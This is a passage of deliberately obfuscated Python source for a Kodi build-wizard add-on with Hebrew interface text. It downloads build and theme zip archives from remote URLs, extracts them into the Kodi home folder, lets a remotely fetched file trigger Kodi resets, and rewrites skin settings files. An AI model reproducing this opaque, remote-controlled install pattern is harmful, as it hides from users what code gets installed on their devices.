			OOOOO0O0000OOOOO0 =O000OO00O0OO0O0O0 .read ()#line:3892
			O000OO00O0OO0O0O0 .close ()#line:3893
			OOOOOOOOO0OO0OO00 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3894
			O0OOO0O00O0OO00OO =re .compile (OOOOOOOOO0OO0OO00 ).findall (OOOOO0O0000OOOOO0 )[0 ]#line:3895
			O000OO00O0OO0O0O0 =open (O000000O000OO0O0O ,'w')#line:3896
			O000OO00O0OO0O0O0 .write (OOOOO0O0000OOOOO0 .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O0OOO0O00O0OO00OO ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3897
			O000OO00O0OO0O0O0 .close ()#line:3898
		except :#line:3899
				pass #line:3900
		swapSkins ('skin.Premium.mod')#line:3901
def buildWizard (OO000O00OO0O0O0O0 ,OO000O000000000OO ,theme =None ,over =False ):#line:3904
	if over ==False :#line:3905
		OOOOO0O0OO0O0OOO0 =wiz .checkBuild (OO000O00OO0O0O0O0 ,'url')#line:3906
		if USERNAME =='':#line:3907
			ADDON .openSettings ()#line:3908
			sys .exit ()#line:3909
		if PASSWORD =='':#line:3910
			ADDON .openSettings ()#line:3911
		OO000O000OO000O0O =u_list (SPEEDFILE )#line:3912
		(OO000O000OO000O0O )#line:3913
		if OOOOO0O0OO0O0OOO0 ==False :#line:3914
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3919
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3920
			return #line:3921
		O0OOOO00OO00O00OO =wiz .workingURL (OOOOO0O0OO0O0OOO0 )#line:3922
		if O0OOOO00OO00O00OO ==False :#line:3923
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,O0OOOO00OO00O00OO ))#line:3924
			return #line:3925
	if OO000O000000000OO =='gui':#line:3926
		if OO000O00OO0O0O0O0 ==BUILDNAME :#line:3927
			if over ==True :OOO000O00000OO000 =1 #line:3928
			else :OOO000O00000OO000 =1 #line:3929
		else :#line:3930
			OOO000O00000OO000 =1 #line:3931
		if OOO000O00000OO000 :#line:3932
			remove_addons ()#line:3933
			remove_addons2 ()#line:3934
			debridit .debridIt ('update','all')#line:3935
			traktit .traktIt ('update','all')#line:3936
			OO0OOOOO0OO00O00O =wiz .checkBuild (OO000O00OO0O0O0O0 ,'gui')#line:3937
			OOOOO0O0O00OO00OO =OO000O00OO0O0O0O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3938
			if not wiz .workingURL (OO0OOOOO0OO00O00O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3939
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3940
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000O00OO0O0O0O0 ),'','אנא המתן')#line:3941
			OOO0OO00OOO0O000O =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOOO0O0O00OO00OO )#line:3942
			try :os .remove (OOO0OO00OOO0O000O )#line:3943
			except :pass #line:3944
			logging .warning (OO0OOOOO0OO00O00O )#line:3945
			if 'google'in OO0OOOOO0OO00O00O :#line:3946
			   O0OOO00OO0000O0OO =googledrive_download (OO0OOOOO0OO00O00O ,OOO0OO00OOO0O000O ,DP ,wiz .checkBuild (OO000O00OO0O0O0O0 ,'filesize'))#line:3947
			else :#line:3950
			  downloader .download (OO0OOOOO0OO00O00O ,OOO0OO00OOO0O000O ,DP )#line:3951
			xbmc .sleep (100 )#line:3952
			O0000OOOO0OOOO000 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000O00OO0O0O0O0 )#line:3953
			DP .update (0 ,O0000OOOO0OOOO000 ,'','אנא המתן')#line:3954
			extract .all (OOO0OO00OOO0O000O ,HOME ,DP ,title =O0000OOOO0OOOO000 )#line:3955
			DP .close ()#line:3956
			wiz .defaultSkin ()#line:3957
			wiz .lookandFeelData ('save')#line:3958
			wiz .kodi17Fix ()#line:3959
			if KODIV >=18 :#line:3960
				skindialogsettind18 ()#line:3961
			debridit .debridIt ('restore','all')#line:3962
			traktit .traktIt ('restore','all')#line:3963
			if INSTALLMETHOD ==1 :O0O00OOOO0O00O0O0 =1 #line:3965
			elif INSTALLMETHOD ==2 :O0O00OOOO0O00O0O0 =0 #line:3966
			else :DP .close ()#line:3967
			O0O00O0OO0OOOOO00 =(NOTIFICATION2 )#line:3968
			O0O00O00O000OOOO0 =urllib2 .urlopen (O0O00O0OO0OOOOO00 )#line:3969
			OO0O0O000OOOOO00O =O0O00O00O000OOOO0 .readlines ()#line:3970
			O0OO0O0O0OOO0O0OO =0 #line:3971
			for OO0O0O000O00O00O0 in OO0O0O000OOOOO00O :#line:3974
				if OO0O0O000O00O00O0 .split (' ==')[0 ]=="noreset"or OO0O0O000O00O00O0 .split ()[0 ]=="noreset":#line:3975
					xbmc .executebuiltin ("ReloadSkin()")#line:3977
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3978
					update_Votes ()#line:3979
					indicatorfastupdate ()#line:3980
				if OO0O0O000O00O00O0 .split (' ==')[0 ]=="reset"or OO0O0O000O00O00O0 .split ()[0 ]=="reset":#line:3981
					update_Votes ()#line:3983
					indicatorfastupdate ()#line:3984
					resetkodi ()#line:3985
		else :#line:3994
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3995
	if OO000O000000000OO =='gui2':#line:3996
		if OO000O00OO0O0O0O0 ==BUILDNAME :#line:3997
			if over ==True :OOO000O00000OO000 =1 #line:3998
			else :OOO000O00000OO000 =1 #line:3999
		else :#line:4000
			OOO000O00000OO000 =1 #line:4001
		if OOO000O00000OO000 :#line:4002
			remove_addons ()#line:4003
			remove_addons2 ()#line:4004
			OO0OOOOO0OO00O00O =wiz .checkBuild (OO000O00OO0O0O0O0 ,'gui')#line:4005
			OOOOO0O0O00OO00OO =OO000O00OO0O0O0O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4006
			if not wiz .workingURL (OO0OOOOO0OO00O00O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4007
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4008
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000O00OO0O0O0O0 ),'','אנא המתן')#line:4009
			OOO0OO00OOO0O000O =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOOO0O0O00OO00OO )#line:4010
			try :os .remove (OOO0OO00OOO0O000O )#line:4011
			except :pass #line:4012
			logging .warning (OO0OOOOO0OO00O00O )#line:4013
			if 'google'in OO0OOOOO0OO00O00O :#line:4014
			   O0OOO00OO0000O0OO =googledrive_download (OO0OOOOO0OO00O00O ,OOO0OO00OOO0O000O ,DP ,wiz .checkBuild (OO000O00OO0O0O0O0 ,'filesize'))#line:4015
			else :#line:4018
			  downloader .download (OO0OOOOO0OO00O00O ,OOO0OO00OOO0O000O ,DP )#line:4019
			xbmc .sleep (100 )#line:4020
			O0000OOOO0OOOO000 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000O00OO0O0O0O0 )#line:4021
			DP .update (0 ,O0000OOOO0OOOO000 ,'','אנא המתן')#line:4022
			extract .all (OOO0OO00OOO0O000O ,HOME ,DP ,title =O0000OOOO0OOOO000 )#line:4023
			DP .close ()#line:4024
			wiz .defaultSkin ()#line:4025
			wiz .lookandFeelData ('save')#line:4026
			if INSTALLMETHOD ==1 :O0O00OOOO0O00O0O0 =1 #line:4029
			elif INSTALLMETHOD ==2 :O0O00OOOO0O00O0O0 =0 #line:4030
			else :DP .close ()#line:4031
		else :#line:4033
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4034
	elif OO000O000000000OO =='fresh':#line:4035
		freshStart (OO000O00OO0O0O0O0 )#line:4036
	elif OO000O000000000OO =='normal':#line:4037
		if url =='normal':#line:4038
			if KEEPTRAKT =='true':#line:4039
				traktit .autoUpdate ('all')#line:4040
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4041
			if KEEPREAL =='true':#line:4042
				debridit .autoUpdate ('all')#line:4043
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4044
			if KEEPLOGIN =='true':#line:4045
				loginit .autoUpdate ('all')#line:4046
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4047
		O000000OO0OO0OOOO =int (KODIV );O00O000OO0O0O00O0 =int (float (wiz .checkBuild (OO000O00OO0O0O0O0 ,'kodi')))#line:4048
		if not O000000OO0OO0OOOO ==O00O000OO0O0O00O0 :#line:4049
			if O000000OO0OO0OOOO ==16 and O00O000OO0O0O00O0 <=15 :OO0OO0OOO000OO0OO =False #line:4050
			else :OO0OO0OOO000OO0OO =True #line:4051
		else :OO0OO0OOO000OO0OO =False #line:4052
		if OO0OO0OOO000OO0OO ==True :#line:4053
			O0OO0OOO00O000OOO =1 #line:4054
		else :#line:4055
			if not over ==False :O0OO0OOO00O000OOO =1 #line:4056
			else :O0OO0OOO00O000OOO =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4057
		if O0OO0OOO00O000OOO :#line:4058
			wiz .clearS ('build')#line:4059
			OO0OOOOO0OO00O00O =wiz .checkBuild (OO000O00OO0O0O0O0 ,'url')#line:4060
			OOOOO0O0O00OO00OO =OO000O00OO0O0O0O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4061
			if not wiz .workingURL (OO0OOOOO0OO00O00O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4062
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4063
			DP .create (ADDONTITLE ,'[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR][B]מוריד[/B]'%(COLOR2 ,COLOR1 ,OO000O00OO0O0O0O0 ,wiz .checkBuild (OO000O00OO0O0O0O0 ,'version')),'','אנא המתן')#line:4064
			OOO0OO00OOO0O000O =os .path .join (PACKAGES ,'%s.zip'%OOOOO0O0O00OO00OO )#line:4065
			try :os .remove (OOO0OO00OOO0O000O )#line:4066
			except :pass #line:4067
			logging .warning (OO0OOOOO0OO00O00O )#line:4068
			if 'google'in OO0OOOOO0OO00O00O :#line:4069
			   O0OOO00OO0000O0OO =googledrive_download (OO0OOOOO0OO00O00O ,OOO0OO00OOO0O000O ,DP ,wiz .checkBuild (OO000O00OO0O0O0O0 ,'filesize'))#line:4070
			else :#line:4073
			  downloader .download (OO0OOOOO0OO00O00O ,OOO0OO00OOO0O000O ,DP )#line:4074
			xbmc .sleep (1000 )#line:4075
			O0000OOOO0OOOO000 ='[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000O00OO0O0O0O0 ,wiz .checkBuild (OO000O00OO0O0O0O0 ,'version'))#line:4076
			DP .update (0 ,O0000OOOO0OOOO000 ,'','אנא המתן...')#line:4077
			OO0OOO000O0O00O0O ,O0OO0O00OOO0OOO0O ,O0OOOOOO0O0O00000 =extract .all (OOO0OO00OOO0O000O ,HOME ,DP ,title =O0000OOOO0OOOO000 )#line:4078
			if int (float (OO0OOO000O0O00O0O ))>0 :#line:4079
				try :#line:4080
					wiz .fixmetas ()#line:4081
				except :pass #line:4082
				wiz .lookandFeelData ('save')#line:4083
				wiz .defaultSkin ()#line:4084
				wiz .setS ('buildname',OO000O00OO0O0O0O0 )#line:4086
				wiz .setS ('buildversion',wiz .checkBuild (OO000O00OO0O0O0O0 ,'version'))#line:4087
				wiz .setS ('buildtheme','')#line:4088
				wiz .setS ('latestversion',wiz .checkBuild (OO000O00OO0O0O0O0 ,'version'))#line:4089
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4090
				wiz .setS ('installed','true')#line:4091
				wiz .setS ('extract',str (OO0OOO000O0O00O0O ))#line:4092
				wiz .setS ('errors',str (O0OO0O00OOO0OOO0O ))#line:4093
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OO0OOO000O0O00O0O ,O0OO0O00OOO0OOO0O ))#line:4094
				fastupdatefirstbuild (NOTEID )#line:4095
				wiz .kodi17Fix ()#line:4096
				skin_homeselect ()#line:4097
				skin_lower ()#line:4098
				rdbuildinstall ()#line:4099
				try :gaiaserenaddon ()#line:4100
				except :pass #line:4101
				adults18 ()#line:4102
				skinfix18 ()#line:4103
				try :os .remove (OOO0OO00OOO0O000O )#line:4105
				except :pass #line:4106
				O000O0OOO00O0OOOO =(ADDON .getSetting ("auto_rd"))#line:4107
				if O000O0OOO00O0OOOO =='true':#line:4108
					try :#line:4109
						setautorealdebrid ()#line:4110
					except :pass #line:4111
				try :#line:4112
					autotrakt ()#line:4113
				except :pass #line:4114
				OO00O00000OO00000 =(ADDON .getSetting ("imdb_on"))#line:4115
				if OO00O00000OO00000 =='true':#line:4116
					imdb_synck ()#line:4117
				iptvset ()#line:4118
				DP .close ()#line:4126
				OOO0O00OOO000O0OO =wiz .themeCount (OO000O00OO0O0O0O0 )#line:4127
				builde_Votes ()#line:4128
				indicator ()#line:4129
				if not OOO0O00OOO000O0OO ==False :#line:4130
					buildWizard (OO000O00OO0O0O0O0 ,'theme')#line:4131
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4132
				if INSTALLMETHOD ==1 :O0O00OOOO0O00O0O0 =1 #line:4133
				elif INSTALLMETHOD ==2 :O0O00OOOO0O00O0O0 =0 #line:4134
				else :resetkodi ()#line:4135
				if O0O00OOOO0O00O0O0 ==1 :wiz .reloadFix ()#line:4137
				else :wiz .killxbmc (True )#line:4138
			else :#line:4139
				if isinstance (O0OO0O00OOO0OOO0O ,unicode ):#line:4140
					O0OOOOOO0O0O00000 =O0OOOOOO0O0O00000 .encode ('utf-8')#line:4141
				O00000OO0OOO0O00O =open (OOO0OO00OOO0O000O ,'r')#line:4142
				OO0O000O000OO0O0O =O00000OO0OOO0O00O .read ()#line:4143
				OOO000O0OOOO0OO0O =''#line:4144
				for OO00O0O0O00O0O00O in O0OOO00OO0000O0OO :#line:4145
				  OOO000O0OOOO0OO0O ='key: '+OOO000O0OOOO0OO0O +'\n'+OO00O0O0O00O0O00O #line:4146
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,O0OOOOOO0O0O00000 +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+OOO000O0OOOO0OO0O )#line:4147
		else :#line:4148
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4149
	elif OO000O000000000OO =='theme':#line:4150
		if theme ==None :#line:4151
			OOO0O00OOO000O0OO =wiz .checkBuild (OO000O00OO0O0O0O0 ,'theme')#line:4152
			O00OO0O0OO0OOO000 =[]#line:4153
			if not OOO0O00OOO000O0OO =='http://'and wiz .workingURL (OOO0O00OOO000O0OO )==True :#line:4154
				O00OO0O0OO0OOO000 =wiz .themeCount (OO000O00OO0O0O0O0 ,False )#line:4155
				if len (O00OO0O0OO0OOO000 )>0 :#line:4156
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,OO000O00OO0O0O0O0 ,COLOR1 ,len (O00OO0O0OO0OOO000 )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4157
						wiz .log ("Theme List: %s "%str (O00OO0O0OO0OOO000 ))#line:4158
						O0OO0000OO0O0OOO0 =DIALOG .select (ADDONTITLE ,O00OO0O0OO0OOO000 )#line:4159
						wiz .log ("Theme install selected: %s"%O0OO0000OO0O0OOO0 )#line:4160
						if not O0OO0000OO0O0OOO0 ==-1 :theme =O00OO0O0OO0OOO000 [O0OO0000OO0O0OOO0 ];O00000OO00OOO00O0 =True #line:4161
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4162
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4163
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4164
		else :O00000OO00OOO00O0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,OO000O00OO0O0O0O0 ,wiz .checkBuild (OO000O00OO0O0O0O0 ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4165
		if O00000OO00OOO00O0 :#line:4166
			O0O000OOOOO0O00O0 =wiz .checkTheme (OO000O00OO0O0O0O0 ,theme ,'url')#line:4167
			OOOOO0O0O00OO00OO =OO000O00OO0O0O0O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4168
			if not wiz .workingURL (O0O000OOOOO0O00O0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4169
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4170
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4171
			OOO0OO00OOO0O000O =os .path .join (PACKAGES ,'%s.zip'%OOOOO0O0O00OO00OO )#line:4172
			try :os .remove (OOO0OO00OOO0O000O )#line:4173
			except :pass #line:4174
			downloader .download (O0O000OOOOO0O00O0 ,OOO0OO00OOO0O000O ,DP )#line:4175
			xbmc .sleep (1000 )#line:4176
			DP .update (0 ,"","Installing %s "%OO000O00OO0O0O0O0 )#line:4177
			O00O0OOOO00000O00 =False #line:4178
			if url not in ["fresh","normal"]:#line:4179
				O00O0OOOO00000O00 =testTheme (OOO0OO00OOO0O000O )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4180
				OO00OOOO0OO0OO0O0 =testGui (OOO0OO00OOO0O000O )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4181
				if O00O0OOOO00000O00 ==True :#line:4182
					wiz .lookandFeelData ('save')#line:4183
					O0OO0OOOOO00O0O00 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4184
					O0000OOO00O0000OO =xbmc .getSkinDir ()#line:4185
					skinSwitch .swapSkins (O0OO0OOOOO00O0O00 )#line:4187
					OO0O0O000OOOOO00O =0 #line:4188
					xbmc .sleep (1000 )#line:4189
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO0O0O000OOOOO00O <150 :#line:4190
						OO0O0O000OOOOO00O +=1 #line:4191
						xbmc .sleep (1000 )#line:4192
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4193
						wiz .ebi ('SendClick(11)')#line:4194
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4195
					xbmc .sleep (1000 )#line:4196
			O0000OOOO0OOOO000 ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4197
			DP .update (0 ,O0000OOOO0OOOO000 ,'','אנא המתן')#line:4198
			OO0OOO000O0O00O0O ,O0OO0O00OOO0OOO0O ,O0OOOOOO0O0O00000 =extract .all (OOO0OO00OOO0O000O ,HOME ,DP ,title =O0000OOOO0OOOO000 )#line:4199
			wiz .setS ('buildtheme',theme )#line:4200
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(OO0OOO000O0O00O0O ,O0OO0O00OOO0OOO0O ))#line:4201
			DP .close ()#line:4202
			if url not in ["fresh","normal"]:#line:4203
				wiz .forceUpdate ()#line:4204
				if KODIV >=17 :wiz .kodi17Fix ()#line:4205
				if OO00OOOO0OO0OO0O0 ==True :#line:4206
					wiz .lookandFeelData ('save')#line:4207
					wiz .defaultSkin ()#line:4208
					O0000OOO00O0000OO =wiz .getS ('defaultskin')#line:4209
					skinSwitch .swapSkins (O0000OOO00O0000OO )#line:4210
					OO0O0O000OOOOO00O =0 #line:4211
					xbmc .sleep (1000 )#line:4212
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO0O0O000OOOOO00O <150 :#line:4213
						OO0O0O000OOOOO00O +=1 #line:4214
						xbmc .sleep (1000 )#line:4215
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4217
						wiz .ebi ('SendClick(11)')#line:4218
					wiz .lookandFeelData ('restore')#line:4219
				elif O00O0OOOO00000O00 ==True :#line:4220
					skinSwitch .swapSkins (O0000OOO00O0000OO )#line:4221
					OO0O0O000OOOOO00O =0 #line:4222
					xbmc .sleep (1000 )#line:4223
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO0O0O000OOOOO00O <150 :#line:4224
						OO0O0O000OOOOO00O +=1 #line:4225
						xbmc .sleep (1000 )#line:4226
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4228
						wiz .ebi ('SendClick(11)')#line:4229
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4230
					wiz .lookandFeelData ('restore')#line:4231
				else :#line:4232
					wiz .ebi ("ReloadSkin()")#line:4233
					xbmc .sleep (1000 )#line:4234
					wiz .ebi ("Container.Refresh")#line:4235
		else :#line:4236
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4237
def skin_homeselect ():#line:4241
	try :#line:4243
		O00O0000000000000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4244
		O0O0O00OO0OOO00O0 =open (O00O0000000000000 ,'r')#line:4246
		O000O0OO00O0OO0O0 =O0O0O00OO0OOO00O0 .read ()#line:4247
		O0O0O00OO0OOO00O0 .close ()#line:4248
		OOO0000000O0O0OOO ='<setting id="HomeS" type="string(.+?)/setting>'#line:4249
		OOOO000OO0OOOO0OO =re .compile (OOO0000000O0O0OOO ).findall (O000O0OO00O0OO0O0 )[0 ]#line:4250
		O0O0O00OO0OOO00O0 =open (O00O0000000000000 ,'w')#line:4251
		O0O0O00OO0OOO00O0 .write (O000O0OO00O0OO0O0 .replace ('<setting id="HomeS" type="string%s/setting>'%OOOO000OO0OOOO0OO ,'<setting id="HomeS" type="string"></setting>'))#line:4252
		O0O0O00OO0OOO00O0 .close ()#line:4253
	except :#line:4254
		pass #line:4255
def skin_lower ():#line:4258
	OO0O00O000OOO0OO0 =(ADDON .getSetting ("lower"))#line:4259
	if OO0O00O000OOO0OO0 =='true':#line:4260
		try :#line:4263
			O00000O0O0000O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4264
			O0O0OO00O00OOO00O =open (O00000O0O0000O00O ,'r')#line:4266
			OOO000000O00OOOO0 =O0O0OO00O00OOO00O .read ()#line:4267
			O0O0OO00O00OOO00O .close ()#line:4268
			OOOO00O0OOO00OO0O ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4269
			O000OO0OOO0000O0O =re .compile (OOOO00O0OOO00OO0O ).findall (OOO000000O00OOOO0 )[0 ]#line:4270
			O0O0OO00O00OOO00O =open (O00000O0O0000O00O ,'w')#line:4271
			O0O0OO00O00OOO00O .write (OOO000000O00OOOO0 .replace ('<setting id="none_widget" type="bool%s/setting>'%O000OO0OOO0000O0O ,'<setting id="none_widget" type="bool">true</setting>'))#line:4272
			O0O0OO00O00OOO00O .close ()#line:4273
			O00000O0O0000O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4275
			O0O0OO00O00OOO00O =open (O00000O0O0000O00O ,'r')#line:4277
			OOO000000O00OOOO0 =O0O0OO00O00OOO00O .read ()#line:4278
			O0O0OO00O00OOO00O .close ()#line:4279
			OOOO00O0OOO00OO0O ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:4280
			O000OO0OOO0000O0O =re .compile (OOOO00O0OOO00OO0O ).findall (OOO000000O00OOOO0 )[0 ]#line:4281
			O0O0OO00O00OOO00O =open (O00000O0O0000O00O ,'w')#line:4282
			O0O0OO00O00OOO00O .write (OOO000000O00OOOO0 .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%O000OO0OOO0000O0O ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:4283
			O0O0OO00O00OOO00O .close ()#line:4284
			O00000O0O0000O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4286
			O0O0OO00O00OOO00O =open (O00000O0O0000O00O ,'r')#line:4288
			OOO000000O00OOOO0 =O0O0OO00O00OOO00O .read ()#line:4289
			O0O0OO00O00OOO00O .close ()#line:4290
			OOOO00O0OOO00OO0O ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4291
			O000OO0OOO0000O0O =re .compile (OOOO00O0OOO00OO0O ).findall (OOO000000O00OOOO0 )[0 ]#line:4292
			O0O0OO00O00OOO00O =open (O00000O0O0000O00O ,'w')#line:4293
			O0O0OO00O00OOO00O .write (OOO000000O00OOOO0 .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%O000OO0OOO0000O0O ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4294
			O0O0OO00O00OOO00O .close ()#line:4295
			O00000O0O0000O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4299
			O0O0OO00O00OOO00O =open (O00000O0O0000O00O ,'r')#line:4301
			OOO000000O00OOOO0 =O0O0OO00O00OOO00O .read ()#line:4302
			O0O0OO00O00OOO00O .close ()#line:4303
			OOOO00O0OOO00OO0O ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4304
			O000OO0OOO0000O0O =re .compile (OOOO00O0OOO00OO0O ).findall (OOO000000O00OOOO0 )[0 ]#line:4305
			O0O0OO00O00OOO00O =open (O00000O0O0000O00O ,'w')#line:4306
			O0O0OO00O00OOO00O .write (OOO000000O00OOOO0 .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%O000OO0OOO0000O0O ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4307
			O0O0OO00O00OOO00O .close ()#line:4308
			O00000O0O0000O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4312
			O0O0OO00O00OOO00O =open (O00000O0O0000O00O ,'r')#line:4314
			OOO000000O00OOOO0 =O0O0OO00O00OOO00O .read ()#line:4315
			O0O0OO00O00OOO00O .close ()#line:4316
